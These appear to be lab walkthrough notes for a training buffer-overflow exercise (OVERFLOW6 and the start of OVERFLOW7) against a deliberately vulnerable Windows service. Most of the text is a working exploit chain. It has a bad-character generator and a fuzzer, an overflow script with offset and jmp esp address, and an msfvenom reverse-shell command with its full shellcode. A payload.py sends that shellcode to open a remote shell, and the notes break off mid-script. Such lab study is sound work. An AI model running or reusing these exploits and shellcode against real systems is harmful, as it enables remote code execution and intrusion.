22. In Immunity Debugger. Create a BADCHARS using mona. By default the syntax \\x00 is a BADCHAR.

`!mona bytearray -b "\x00"

![800](img/Pasted%20image%2020240902184059.png)


23. Creating bad chars. In Kali. By using a python script. Generate a string of bad chars from \\x01 to \\xff.

```python
#!/usr/bin/env python3

from __future__ import print_function

#tart with 00 and add any others you find
bad = "00".split()

#turns them into a nice string to copy into python
print("badchars = ")
for x in range(1, 256):
	if "{:02x}".format(x) not in bad: 
		print("\\x" + "{:02x}".format(x), end='')

#creates a nice string to use in Mona
print("\n\nfor mona")
for byte in bad:
	print("\\x{}".format(byte), end='')
print()
```

```shell
┌──(root㉿kali)-[/transfer]
└─# python3 create.py 
badchars = 
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff

for mona
\x00
```


24. Using the generated bad chars, copy and edit the exploit.py.

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW6 "  # The command or identifier expected by the target service
offset = 1034             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = "BBBB"              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details
```


25. In target machine. Immunity Debugger > Debug > Restart > Play.


26. Execute exploit.py

```shell
┌──(root㉿kali)-[/transfer]
└─# python3 exploit.py
Sending evil buffer...
Done!
```


27. In Immunity Debugger.  ESP 01A5FA30.

![800](img/Pasted%20image%2020240902184259.png)


28. In Immunity Debugger. Run the mona command to compare the bin and ESP value.

`!mona compare -f C:\mona\oscp\bytearray.bin -a 01A5FA30

![800](img/Pasted%20image%2020240902184346.png)

mona Memory comparison results, item 0
 Address=0x01a5fa30
 Status=Corruption after 7 bytes
 BadChars=00 08 09 2c 2d ad ae
 Type=normal
 Location=Stack




29. Based on the output 00 08 09 2c 2d ad ae. Only use 00 08 2c ad to be excluded in creating the bad chars. Edit the create.py.


```python
#!/usr/bin/env python3

from __future__ import print_function

#tart with 00 and add any others you find
bad = "00 08 2c ad".split()

#turns them into a nice string to copy into python
print("badchars = ")
for x in range(1, 256):
	if "{:02x}".format(x) not in bad: 
		print("\\x" + "{:02x}".format(x), end='')

#creates a nice string to use in Mona
print("\n\nfor mona")
for byte in bad:
	print("\\x{}".format(byte), end='')
print()
```


```shell
┌──(root㉿kali)-[/transfer]
└─# python3 create.py 
badchars = 
\x01\x02\x03\x04\x05\x06\x07\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff

for mona
\x00\x08\x2c\xad

```

	Task 7
		b. In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW6?
			\x00\x08\x2c\xad


30. In target machine. Immunity Debugger. Tell mona to update the bytearray.

`!mona bytearray -b "\x00\x08\x2c\xad"

![800](img/Pasted%20image%2020240902184602.png)


31. In target machine. Immunity Debugger > Debug > Restart > Play.


32. Edit the exploit.py with the bad chars. Then execute the exploit.py.

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW6 "  # The command or identifier expected by the target service
offset = 1034             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = "BBBB"              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = "\x01\x02\x03\x04\x05\x06\x07\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details
```

![](img/Pasted%20image%2020240829171740.png)


31. Immunity Debugger. Compare using mona.

** Do not restart Immunity Debbuger.

`!mona compare -f C:\mona\oscp\bytearray.bin -a esp

![800](img/Pasted%20image%2020240902184812.png)


32. Immunity Debugger > Debug > Restart


33. Use the command mona jmp, the esp and the excluded bad chars.

`!mona jmp -r esp -cpb "\x00\x08\x2c\xad"

Go to View > Log 
Select and double click Log Data

![800](img/Pasted%20image%2020240902184907.png)

Showing ESP 625011AF

![800](img/Pasted%20image%2020240902184930.png)


34. Create shellcode using msfvenom

`msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=9009 EXITFUNC=thread -b "\x00\x08\x2c\xad" -f python -v "shellcode"


```shell
┌──(root㉿kali)-[/transfer]
└─# msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=9009 EXITFUNC=thread -b "\x00\x08\x2c\xad" -f python -v "shellcode"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1965 bytes
shellcode =  b""
shellcode += b"\xba\xd9\x57\xd7\x2f\xda\xd3\xd9\x74\x24\xf4"
shellcode += b"\x5e\x33\xc9\xb1\x52\x83\xc6\x04\x31\x56\x0e"
shellcode += b"\x03\x8f\x59\x35\xda\xd3\x8e\x3b\x25\x2b\x4f"
shellcode += b"\x5c\xaf\xce\x7e\x5c\xcb\x9b\xd1\x6c\x9f\xc9"
shellcode += b"\xdd\x07\xcd\xf9\x56\x65\xda\x0e\xde\xc0\x3c"
shellcode += b"\x21\xdf\x79\x7c\x20\x63\x80\x51\x82\x5a\x4b"
shellcode += b"\xa4\xc3\x9b\xb6\x45\x91\x74\xbc\xf8\x05\xf0"
shellcode += b"\x88\xc0\xae\x4a\x1c\x41\x53\x1a\x1f\x60\xc2"
shellcode += b"\x10\x46\xa2\xe5\xf5\xf2\xeb\xfd\x1a\x3e\xa5"
shellcode += b"\x76\xe8\xb4\x34\x5e\x20\x34\x9a\x9f\x8c\xc7"
shellcode += b"\xe2\xd8\x2b\x38\x91\x10\x48\xc5\xa2\xe7\x32"
shellcode += b"\x11\x26\xf3\x95\xd2\x90\xdf\x24\x36\x46\x94"
shellcode += b"\x2b\xf3\x0c\xf2\x2f\x02\xc0\x89\x54\x8f\xe7"
shellcode += b"\x5d\xdd\xcb\xc3\x79\x85\x88\x6a\xd8\x63\x7e"
shellcode += b"\x92\x3a\xcc\xdf\x36\x31\xe1\x34\x4b\x18\x6e"
shellcode += b"\xf8\x66\xa2\x6e\x96\xf1\xd1\x5c\x39\xaa\x7d"
shellcode += b"\xed\xb2\x74\x7a\x12\xe9\xc1\x14\xed\x12\x32"
shellcode += b"\x3d\x2a\x46\x62\x55\x9b\xe7\xe9\xa5\x24\x32"
shellcode += b"\xbd\xf5\x8a\xed\x7e\xa5\x6a\x5e\x17\xaf\x64"
shellcode += b"\x81\x07\xd0\xae\xaa\xa2\x2b\x39\xdf\x39\x72"
shellcode += b"\x46\xb7\x3f\x74\x9b\x79\xc9\x92\xb1\x69\x9f"
shellcode += b"\x0d\x2e\x13\xba\xc5\xcf\xdc\x10\xa0\xd0\x57"
shellcode += b"\x97\x55\x9e\x9f\xd2\x45\x77\x50\xa9\x37\xde"
shellcode += b"\x6f\x07\x5f\xbc\xe2\xcc\x9f\xcb\x1e\x5b\xc8"
shellcode += b"\x9c\xd1\x92\x9c\x30\x4b\x0d\x82\xc8\x0d\x76"
shellcode += b"\x06\x17\xee\x79\x87\xda\x4a\x5e\x97\x22\x52"
shellcode += b"\xda\xc3\xfa\x05\xb4\xbd\xbc\xff\x76\x17\x17"
shellcode += b"\x53\xd1\xff\xee\x9f\xe2\x79\xef\xf5\x94\x65"
shellcode += b"\x5e\xa0\xe0\x9a\x6f\x24\xe5\xe3\x8d\xd4\x0a"
shellcode += b"\x3e\x16\xf4\xe8\xea\x63\x9d\xb4\x7f\xce\xc0"
shellcode += b"\x46\xaa\x0d\xfd\xc4\x5e\xee\xfa\xd5\x2b\xeb"
shellcode += b"\x47\x52\xc0\x81\xd8\x37\xe6\x36\xd8\x1d"

```


35. Create python script for payload.py

```python
#!/usr/bin/env python3

import socket  # Import the socket library for network communication

# Target IP address and port where the vulnerable service is running
ip = 'target.local'
port = 1337

# Shellcode: This is the payload that will be executed on the target machine
# The shellcode is written in hexadecimal format representing machine instructions

shellcode =  ""
shellcode += "\xba\xd9\x57\xd7\x2f\xda\xd3\xd9\x74\x24\xf4"
shellcode += "\x5e\x33\xc9\xb1\x52\x83\xc6\x04\x31\x56\x0e"
shellcode += "\x03\x8f\x59\x35\xda\xd3\x8e\x3b\x25\x2b\x4f"
shellcode += "\x5c\xaf\xce\x7e\x5c\xcb\x9b\xd1\x6c\x9f\xc9"
shellcode += "\xdd\x07\xcd\xf9\x56\x65\xda\x0e\xde\xc0\x3c"
shellcode += "\x21\xdf\x79\x7c\x20\x63\x80\x51\x82\x5a\x4b"
shellcode += "\xa4\xc3\x9b\xb6\x45\x91\x74\xbc\xf8\x05\xf0"
shellcode += "\x88\xc0\xae\x4a\x1c\x41\x53\x1a\x1f\x60\xc2"
shellcode += "\x10\x46\xa2\xe5\xf5\xf2\xeb\xfd\x1a\x3e\xa5"
shellcode += "\x76\xe8\xb4\x34\x5e\x20\x34\x9a\x9f\x8c\xc7"
shellcode += "\xe2\xd8\x2b\x38\x91\x10\x48\xc5\xa2\xe7\x32"
shellcode += "\x11\x26\xf3\x95\xd2\x90\xdf\x24\x36\x46\x94"
shellcode += "\x2b\xf3\x0c\xf2\x2f\x02\xc0\x89\x54\x8f\xe7"
shellcode += "\x5d\xdd\xcb\xc3\x79\x85\x88\x6a\xd8\x63\x7e"
shellcode += "\x92\x3a\xcc\xdf\x36\x31\xe1\x34\x4b\x18\x6e"
shellcode += "\xf8\x66\xa2\x6e\x96\xf1\xd1\x5c\x39\xaa\x7d"
shellcode += "\xed\xb2\x74\x7a\x12\xe9\xc1\x14\xed\x12\x32"
shellcode += "\x3d\x2a\x46\x62\x55\x9b\xe7\xe9\xa5\x24\x32"
shellcode += "\xbd\xf5\x8a\xed\x7e\xa5\x6a\x5e\x17\xaf\x64"
shellcode += "\x81\x07\xd0\xae\xaa\xa2\x2b\x39\xdf\x39\x72"
shellcode += "\x46\xb7\x3f\x74\x9b\x79\xc9\x92\xb1\x69\x9f"
shellcode += "\x0d\x2e\x13\xba\xc5\xcf\xdc\x10\xa0\xd0\x57"
shellcode += "\x97\x55\x9e\x9f\xd2\x45\x77\x50\xa9\x37\xde"
shellcode += "\x6f\x07\x5f\xbc\xe2\xcc\x9f\xcb\x1e\x5b\xc8"
shellcode += "\x9c\xd1\x92\x9c\x30\x4b\x0d\x82\xc8\x0d\x76"
shellcode += "\x06\x17\xee\x79\x87\xda\x4a\x5e\x97\x22\x52"
shellcode += "\xda\xc3\xfa\x05\xb4\xbd\xbc\xff\x76\x17\x17"
shellcode += "\x53\xd1\xff\xee\x9f\xe2\x79\xef\xf5\x94\x65"
shellcode += "\x5e\xa0\xe0\x9a\x6f\x24\xe5\xe3\x8d\xd4\x0a"
shellcode += "\x3e\x16\xf4\xe8\xea\x63\x9d\xb4\x7f\xce\xc0"
shellcode += "\x46\xaa\x0d\xfd\xc4\x5e\xee\xfa\xd5\x2b\xeb"
shellcode += "\x47\x52\xc0\x81\xd8\x37\xe6\x36\xd8\x1d"

# Command to be sent to the target service. "OVERFLOW4 " is the vulnerable function or command.
Command = "OVERFLOW6 "

# Offset: Buffer of 'A's used to overflow the buffer until the return pointer
Offset = 1034 * "A"  # Fills the stack up to the return address (control the EIP)

# jmp: Address of the instruction that redirects execution flow to our shellcode
# "\x03\x11\x50\x62" is the memory address that contains "jmp esp" or a similar instruction
jmp = "\xAF\x11\x50\x62"
    #ESP 625011AF

# NOP sled: Helps guide the execution smoothly into the shellcode by filling with NOP instructions
nops = 16 * "\x90"  # 16 NOP instructions (0x90 is a NOP in x86 architecture)

# Complete exploit string, combining all parts
string = Command + Offset + jmp + shellcode

try:
    # Creating a socket object for TCP communication
    with socket.socket() as s:
        # Attempt to connect to the target IP and port
        s.connect((ip, port))
        print("Sending exploit payload...")
        # Sending the crafted exploit payload
        s.send(bytes(string, 'latin-1'))
        
except Exception as e:
    # If an error occurs during connection or sending, print the error
    print("Failed to connect or send the payload:", e)


```


36. Run nc listener and execute payload

![800](img/Pasted%20image%2020240902181357.png)

![800](img/Pasted%20image%2020240902181406.png)


37. Verify connection, pwnd!




# Task 8 oscp.exe - OVERFLOW7

1. In Kali. Using Remmina, remote to target machine.

![800](img/Pasted%20image%2020240821141857.png)


2. In target machine. Right click Immunity Debugger > Run as administrator. File > Open > Desktop\\vulnerable-apps\\oscp\\oscp. Click red play button, will show Running. 

![800](img/Pasted%20image%2020240903170356.png)


4. In Kali. Open a terminal. NC to the target machine with port 1337. Type "HELP" to view the commands. Type "OVERFLOW7 test" to verify.

![800](img/Pasted%20image%2020240903170443.png)


5. In target machine. In the Immunity Debugger. Input the mona command.

`!mona config -set workingfolder c:\mona\%p

![800](img/Pasted%20image%2020240903170517.png)


6. In Kali. Create a script, fuzzer.py.

```python
#!/usr/bin/env python3

import socket, time, sys  # Import necessary modules: socket for networking, time for delays, sys for exiting the script

# Define the target IP address or hostname
ip = "target.local"

# Define the target port number
port = 1337

# Set the timeout duration (in seconds) for the socket connection
timeout = 5

# Define a prefix to prepend to the payload being sent
prefix = "OVERFLOW7 "

# Initialize the payload with the prefix followed by 100 "A" characters
string = prefix + "A" * 100

# Start an infinite loop to continually send increasing payload sizes
while True:
    try:
        # Create a new socket object for IPv4 (AF_INET) and TCP (SOCK_STREAM)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            # Set the timeout for the socket connection
            s.settimeout(timeout)
            
            # Connect to the target IP and port
            s.connect((ip, port))
            
            # Receive the initial response from the server (optional step to ensure connection)
            s.recv(1024)
            
            # Print the current size of the payload being sent (excluding the prefix)
            print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
            
            # Send the payload to the target server, encoding it as a Latin-1 byte string
            s.send(bytes(string, "latin-1"))
            
            # Receive the server's response (optional step to ensure the payload was sent)
            s.recv(1024)
    
    # If an exception occurs (e.g., the server crashes or connection fails), handle it here
    except:
        # Print the size of the payload that caused the crash and exit the script
        print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
        sys.exit(0)
    
    # Increase the size of the payload by 100 "A" characters for the next iteration
    string += 100 * "A"
    
    # Wait 1 second before sending the next payload (to avoid overwhelming the server)
    time.sleep(1)

```


7. In Kali. Create a script, exploit.py.

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW6 "  # The command or identifier expected by the target service
offset = 0             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = ""              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = ""           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details

```


8. In target machine. Immunity Debugger > Debug > Restart > Play.


9. In Kali. Execute the fuzzer.py. The Immunity Debugger will crash and pause.

![800](img/Pasted%20image%2020240903170826.png)


10. Fuzzing crashed at 1400 bytes. Create a pattern by adding 400 bytes, total of 1800 bytes. 

![800](img/Pasted%20image%2020240903170851.png)


11. Immunity Debugger showing EIP 41414141 overwritten with A(hex=41).

![800](img/Pasted%20image%2020240903170929.png)


12. In Kali. Create msf pattern.

`msf-pattern_create -l 1800

```shell
┌──(root㉿kali)-[/transfer]
└─# msf-pattern_create -l 1800
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9
```


13. In Kali. Edit the script exploit.py and add the output of the msf-pattern.

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW7 "  # The command or identifier expected by the target service
offset = 0             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = ""              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
